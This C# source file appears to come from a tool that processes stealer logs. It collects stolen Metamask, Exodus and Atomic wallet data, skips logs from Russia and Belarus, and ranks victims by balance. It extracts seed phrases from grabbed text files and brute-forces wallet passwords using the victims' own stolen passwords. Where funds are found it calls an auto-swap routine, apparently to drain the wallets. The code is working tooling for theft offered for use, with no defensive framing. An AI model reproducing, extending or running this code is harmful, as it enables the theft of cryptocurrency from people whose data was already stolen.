using System.Collections.Concurrent;
using System.Globalization;
using CryptoEat.Modules.Cryptocurrency;
using CryptoEat.Modules.Wallet;
using Debank;
using NBitcoin;
using Nethereum.Web3.Accounts;
using Pastel;

namespace CryptoEat.Modules.Logs;

internal static class Check
{
    internal static void CheckLogs()
    {
        TaskBar.SetEmpty();
        using var scanner = new Scanner();

        var all = new List<Log>(Logs.LogsList.Count);
        all.AddRange(Logs.LogsList
            .Where(x => x.Wallet is Metamask metamask && !string.IsNullOrEmpty(metamask.WalletInfo?.NormalizedVault))
            .DistinctBy(x => (x.Wallet as Metamask)?.WalletInfo?.NormalizedVault));
        all.AddRange(Logs.LogsList
            .Where(x => x.Wallet is Exodus exodus && !string.IsNullOrEmpty(exodus.Hash))
            .DistinctBy(x => (x.Wallet as Exodus)?.Hash));
        all.AddRange(Logs.LogsList
            .Where(x => x.Wallet is Atomic atomic && !string.IsNullOrEmpty(atomic.MnemoBase64))
            .DistinctBy(x => (x.Wallet as Atomic)?.MnemoBase64));

        #region Russia & Belarus exclude

        var patterns = new List<string>
        {
            "Russia",
            "[RU]",
            "RU_",
            "RU[",

            "Belarus",
            "[BY]",
            "BY_",
            "BY["
        };

        all = all.Where(x => !patterns.Any(y => x.LogPath.Contains(y, StringComparison.CurrentCultureIgnoreCase)))
            .ToList();

        #endregion

        all = all.DistinctBy(z => z.LogPath).ToList();
        all = all.Randomize();
        all = SortLogs(all);

        Helpers.ResetCounters();
        Helpers.Max = all.Count;

        Helpers.SetTitle("Processing...");

        if (Generic.Settings.SeedGrabber)
        {
            #region FileGrabber

            foreach (var log in all)
            {
                Helpers.Count++;
                Helpers.SetTitle("Searching for seeds in FileGrabber...");

                try
                {

                    var dirInfo2 = new DirectoryInfo(log.LogPath);
                    var mnemosExtracted = new List<string>();
                    for (var i = 0; i < 4; i++)
                    {
                        if (Directory.Exists(Path.Combine(dirInfo2.FullName, "FileGrabber")))
                        {
                            var folders = FileSystem.ScanDirectories(Path.Combine(dirInfo2.FullName, "FileGrabber"),
                                false);
                            var files = folders.SelectMany(Directory.EnumerateFiles)
                                .Where(x => Path.GetExtension(x) == ".txt");
                            foreach (var file in files)
                                try
                                {
                                    mnemosExtracted.AddRange(Metamask.RegexSeed.Matches(File.ReadAllText(file))
                                        .Select(x => x.Value.Trim(' ')));
                                }
                                catch
                                {
                                    // ignore
                                }

                            break;
                        }

                        if (dirInfo2.Parent is not null) dirInfo2 = dirInfo2.Parent;
                    }

                    if (mnemosExtracted.Count <= 0) continue;

                    var dict = Wordlist.English.GetWords();

                    var seeds = new List<string>(mnemosExtracted.Count);

                    foreach (var match in mnemosExtracted)
                        try
                        {
                            var temp = match.ToLower().Trim(' ').Replace("\r", "").Replace("\n", "");

                            while (temp.StartsWith(' ')) temp = temp[1..];
                            while (temp.EndsWith(' ')) temp = temp[..^1];

                            temp = temp.Replace(new[] { ',', '|', '-', '+' }, ' ').Replace("  ", " ");

                            var skip = temp.Split(' ').All(dict.Contains);
                            if (!skip) continue;

                            seeds.Add(temp);
                        }
                        catch
                        {
                            // ignore
                        }

                    seeds = seeds.Distinct().ToList();

                    foreach (var seed in seeds)
                    {
                        var mnemo = new Mnemonic(seed);
                        LogStreams.WriteMnemo(seed);

                        var keys = new List<Account>(Generic.Settings.ScanDepth);
                        for (var i = 0; i < Generic.Settings.ScanDepth; i++)
                        {
                            var acc = new Nethereum.HdWallet.Wallet(mnemo.ToString(), "").GetAccount(i);
                            keys.Add(acc);
                        }

                        PassGen.Mnemos.Add(mnemo.ToString() ?? string.Empty);
                        PassGen.Mnemos.UnionWith(keys.Select(x => x.PrivateKey));

                        var output = new Output { Mnemonic = new Mnemonic(seed) };
                        var scanResult = scanner.Scan(output, dirInfo2.FullName, "", "FILEGRABBER");

                        Console.WriteLine(scanResult.LogResult);
                        LogStreams.WriteBrutedLog(scanResult.LogResult ?? string.Empty);

                        if (Math.Round(scanResult.TotalBalance, 1) <= 0m) continue;
                        foreach (var key in keys)
                            AutoTools.AutoSwap(key);
                    }

                }
                catch (Exception ex)
                {
                    Generic.WriteError(ex);
                }
            }

            #endregion

            Helpers.ResetCounters();
            Helpers.Max = all.Count;
        }

        #region Bruteforce

        foreach (var log in all)
        {
            GC.Collect();

            if (Generic.DEBUG)
                if (log.Wallet is Exodus)
                    continue;

            try
            {
                Helpers.Count++;
                Helpers.SetTitle("Cracking logs...");

                if (log.Wallet == null) continue;

                ScanResult? scanResult = null;

                GC.Collect();

                if (log.Wallet.WalletInfo?.Accounts != null && log.Wallet.WalletInfo?.Accounts?.Any() == true)
                {
                    scanResult = Scanner.ScanMulti(log.Wallet.WalletInfo.Accounts, log.LogPath);

                    if (scanResult.LogResult != null &&
                        Math.Round(scanResult.TotalBalance) > Generic.Settings.BalanceThreshold)
                    {
                        Console.WriteLine(scanResult.LogResult);
                        LogStreams.WriteLog(scanResult.LogResult);
                    }
                    else
                    {
                        Console.WriteLine(
                            $"{string.Join(Environment.NewLine, log.Wallet.WalletInfo.Accounts.Select(x => x.Address))} | {scanResult.TotalBalance.ToString(CultureInfo.CurrentCulture).Pastel(Color.LightCoral)}$");
                    }

                    if (Math.Round(scanResult.TotalBalance) <= Generic.Settings.BalanceThreshold) continue;
                }

                Console.WriteLine(
                    $"Trying to crack [{Enum.GetName(log.Wallet.WalletName).Pastel(Color.LightBlue)}]: {(log.Wallet.WalletInfo?.Accounts != null ? Math.Round(scanResult?.TotalBalance ?? 0m, 2).ToString(CultureInfo.InvariantCulture).Pastel(Color.LightCoral) : "n")}$");
                var logO = new LogsHelper(log.LogPath);

                Output? mnemo;
                string? pass;

                void SuccessBrute()
                {
                    if (mnemo == null || string.IsNullOrEmpty(pass)) return;

                    LogStreams.WriteMnemo(mnemo.ToString());
                    if (mnemo.Accounts?.Any() == true)
                        foreach (var account in mnemo.Accounts)
                            LogStreams.WriteMnemo(account.PrivateKey);
                    if (!PassGen.PreviousPasswords.Contains(pass))
                    {
                        LogStreams.AllPasswordsLog.WriteLine(pass);
                        LogStreams.AllPasswordsLog.Flush();
                        PassGen.PreviousPasswords.Add(pass);
                    }

                    var keys = new List<Account>(Generic.Settings.ScanDepth);

                    if (mnemo.Accounts != null) keys = mnemo.Accounts.DistinctBy(x => x.PrivateKey).ToList();

                    if (mnemo.Mnemonic != null)
                        for (var i = 0; i < Generic.Settings.ScanDepth; i++)
                        {
                            var acc = new Nethereum.HdWallet.Wallet(mnemo.Mnemonic.ToString(), "").GetAccount(i);
                            keys.Add(acc);
                        }

                    PassGen.Mnemos.Add(mnemo.Mnemonic?.ToString() ?? string.Empty);
                    PassGen.Mnemos.UnionWith(keys.Select(x => x.PrivateKey));

                    Helpers.SetTitle("Scanning...");

                    scanResult = scanner.Scan(mnemo, log.LogPath, pass);
                    if (scanResult.LogResult != null)
                    {
                        Console.WriteLine(scanResult.LogResult);
                        LogStreams.WriteBrutedLog(scanResult.LogResult);
                    }
                    else
                    {
                        Console.WriteLine(
                            $"Something goes wrong. {"Your mnemo".Pastel(Color.Red)}: [{mnemo.ToString().Pastel(Color.LightCoral)}]");
                    }

                    Helpers.SetTitle();

                    if (Math.Round(scanResult.TotalBalance, 1) <= 0m) return;
                    foreach (var key in keys) AutoTools.AutoSwap(key);
                }

                if ((logO.Passwords?.Count > 0 || PassGen.PreviousPasswords.Count > 0) && Generic.Settings.GpuBrute)
                {
                    var tempPass = logO.Passwords?.Concat(PassGen.PreviousPasswords).ToHashSet();
                    if (tempPass?.Count > 0)
                    {
                        Helpers.SetTitle($"Pre-Cracking log | [{tempPass.Count} passwords]");
                        if (log.Wallet.TryBruteCpu(ref tempPass, out mnemo, out pass))
                        {
                            SuccessBrute();
                            continue;
                        }
                    }
                }

                var result = new HashSet<string>(5000000);
                PassGen.Combinations(logO, log.LogPath, ref result);
                Helpers.SetTitle($"Cracking log | [{result.Count} passwords]");
                if (log.Wallet.TryBrute(ref result, out mnemo, out pass) && mnemo != null)
                {
                    SuccessBrute();
                    result.Clear();
                }
                else
                    Console.WriteLine("\tExhausted :/", Color.LightCoral);
            }
            catch (Exception e)
            {
                Generic.WriteError(e);
            }
        }

        #endregion
    }

    internal static List<Log> SortLogs(List<Log> logs)
    {
        Helpers.ResetCounters();
        Helpers.Max = logs.Count;
        var logsSorted = new List<LogBalance>();
        var allBalances = 0m;

        //var threads = Generic.ProxyCount > 10 ? 10 : Generic.ProxyCount;

        foreach (var log in logs)
        {
            Helpers.Count++;
            Helpers.SetTitle($"Scanning logs... [{Math.Round(allBalances, 2)}$]");
            if (log.Wallet?.WalletInfo?.Accounts == null || log.Wallet.WalletInfo?.Accounts?.Any() != true)
            {
                logsSorted.Add(new LogBalance(log, 0m));
            }
            else
            {
                var balance = Scanner.ScanMulti(log.Wallet.WalletInfo.Accounts, log.LogPath).TotalBalance;
                allBalances += balance;
                logsSorted.Add(new LogBalance(log, balance));
            }
        };
        Helpers.ResetCounters();
        DeBank.SaveCache();
        return logsSorted
            .OrderByDescending(x => x.TotalBalance)
            .Select(x => x.Log)
            .ToList();
    }

}

public static class LinqExtensions
{
    public static List<T> Randomize<T>(this IEnumerable<T> source)
    {
        return source.OrderBy(_ => Random.Shared.Next()).ToList();
    }

    internal static readonly object Locker = new();
}

public class EnumeratorWrapper<T>
{
    private readonly IEnumerator<T> _enumerator;
    public EnumeratorWrapper(IEnumerable<T> enumerable)
    {
        _enumerator = enumerable.GetEnumerator();
        _enumerator.MoveNext();
    }
    public T Next()
    {
        lock (LinqExtensions.Locker)
        {
            var current = _enumerator.Current;
            if (_enumerator.MoveNext()) return current;
            _enumerator.Reset();
            _enumerator.MoveNext();
            return current;
        }
    }
}

internal class LogBalance(Log log, decimal balance)
{
    internal Log Log = log;
    internal decimal TotalBalance = balance;
}